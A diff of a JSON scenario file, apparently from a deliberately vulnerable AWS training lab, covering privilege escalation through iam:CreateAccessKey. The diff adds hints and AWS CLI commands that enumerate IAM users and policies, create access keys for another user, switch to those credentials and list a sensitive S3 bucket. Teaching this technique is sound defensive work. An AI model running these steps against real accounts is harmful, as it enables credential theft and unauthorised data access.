@@ -1,5 +1,5 @@
 {
-  "displayName": "One-Hop Privilege Escalation: iam:CreateAccessKey",
+  "displayName": "IAM Access Key Creation to Bucket",
   "name": "iam-002-iam-createaccesskey",
   "description": "User with iam:CreateAccessKey can create credentials for user with S3 bucket access",
   "costEstimate": "$0/mo",
@@ -31,11 +31,12 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-bucket/iam-002-iam-createaccesskey"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-bucket/iam-002-iam-createaccesskey",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "iam:CreateAccessKey",
+        "principal": "pl-prod-iam-002-to-bucket-privesc-user",
         "resource": "arn:aws:iam::*:user/pl-prod-iam-002-to-bucket-access-user",
         "description": "create new credentials for the bucket access user"
       }
@@ -43,14 +44,17 @@
     "helpful": [
       {
         "permission": "iam:ListUsers",
+        "principal": "pl-prod-iam-002-to-bucket-privesc-user",
         "purpose": "discover users with S3 access"
       },
       {
         "permission": "iam:GetUserPolicy",
+        "principal": "pl-prod-iam-002-to-bucket-privesc-user",
         "purpose": "view a user's inline policies"
       },
       {
         "permission": "iam:ListAttachedUserPolicies",
+        "principal": "pl-prod-iam-002-to-bucket-privesc-user",
         "purpose": "identify users with S3 permissions"
       }
     ]
@@ -126,14 +130,29 @@
         "label": "iam:CreateAccessKey",
         "description": "Create a new set of access keys for the bucket access user, gaining the ability to authenticate as that user and access the sensitive S3 bucket.\n",
         "hints": [
-          "You can create credentials for other IAM users.",
-          "Look for users that have access to S3 buckets containing sensitive data.",
-          "Browse to https://pathfinding.cloud/paths/iam-002 for technique details."
+          "Start by confirming your identity and verifying that your starting user has no direct S3 access.",
+          "Use your helpful IAM permissions to enumerate other users in the account and understand what they can do.",
+          "Look at the policies attached to other users -- you're looking for a user with S3 bucket permissions.",
+          "Once you've identified a user with data access, check whether your starting user can create credentials for them.",
+          "You can mint long-lived programmatic credentials for another IAM user with a single API call -- no MFA required.",
+          "Browse to https://pathfinding.cloud/paths/iam-002 for full technique details."
         ],
         "commands": [
           {
+            "description": "Verify starting user identity",
+            "command": "aws sts get-caller-identity --query 'Arn' --output text"
+          },
+          {
+            "description": "List IAM users to find candidates with S3 access",
+            "command": "aws iam list-users --query 'Users[].UserName' --output table"
+          },
+          {
+            "description": "Inspect policies attached to the bucket access user",
+            "command": "aws iam list-attached-user-policies --user-name pl-prod-iam-002-to-bucket-access-user"
+          },
+          {
             "description": "Create access keys for the bucket access user",
-            "command": "aws iam create-access-key --user-name pl-prod-iam-002-to-bucket-access-user"
+            "command": "aws iam create-access-key --user-name pl-prod-iam-002-to-bucket-access-user --output json"
           }
         ]
       },
@@ -143,10 +162,24 @@
         "label": "s3:GetObject, s3:PutObject",
         "description": "Use the newly created credentials to access the sensitive S3 bucket and retrieve its contents.\n",
         "hints": [
-          "This user has direct S3 bucket access. Use the credentials you created to authenticate as this user.",
-          "List the bucket contents and retrieve the sensitive data file."
+          "Export the newly created access key and secret as environment variables to switch your AWS CLI context to the bucket access user.",
+          "Wait a short time after creating the keys before using them -- AWS IAM credential propagation takes a few seconds.",
+          "List the S3 buckets available to this user to find the target -- look for buckets matching the scenario naming pattern.",
+          "Once you find the bucket, list its contents and retrieve the sensitive data file."
         ],
         "commands": [
+          {
+            "description": "Configure the new credentials",
+            "command": "export AWS_ACCESS_KEY_ID=<new-key-id> && export AWS_SECRET_ACCESS_KEY=<new-secret> && unset AWS_SESSION_TOKEN"
+          },
+          {
+            "description": "Confirm identity as the bucket access user",
+            "command": "aws sts get-caller-identity --query 'Arn' --output text"
+          },
+          {
+            "description": "Find the target bucket",
+            "command": "aws s3api list-buckets --query \"Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name\" --output text"
+          },
           {
             "description": "List objects in the sensitive bucket",
             "command": "aws s3 ls s3://pl-prod-iam-002-to-bucket-{account_id}"
